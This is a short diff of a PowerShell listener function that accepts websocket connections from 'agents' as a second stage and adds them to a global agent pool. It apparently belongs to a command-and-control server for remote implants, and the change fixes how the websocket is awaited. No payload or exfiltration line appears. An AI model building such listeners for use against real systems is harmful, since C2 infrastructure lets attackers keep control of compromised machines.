@@ -72,13 +72,15 @@ Function Global:New-Listerner()
 			# handle websocket (second stage)
 			write-host "Agent connection: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
 
-			$ws = $context.AcceptWebSocketAsync()
-			
+			$wsSync   = $context.AcceptWebSocketAsync()
+			$wsResult = $wsSync.ConfigureAwait().GetAwaiter().GetResult()
+			#$ws.WebSocket
+			$websocket = $wsResult.WebSocket
 			
 			$Agent = [PSCustomObject]@{
 					# required information
 					UUID             = (New-Guid).Guid
-					RAWConnection    = [Object]$ws
+					RAWConnection    = [Object]$websocket
 					AGENTIP          = $context.Request.RemoteEndPoint.Address.ToString()
 
 					# information enumerated
@@ -93,8 +95,8 @@ Function Global:New-Listerner()
 					ResponseQueue     = @()
 
 					# objects to interact with
-					StreamReader     = $ws.ReceiveAsync()
-					StreamWriter     = $ws.SendAsync()
+					StreamReader     = $websocket.ReceiveAsync()
+					StreamWriter     = $websocket.SendAsync()
 				}
 				
 				$Global:AgentPool += $Agent
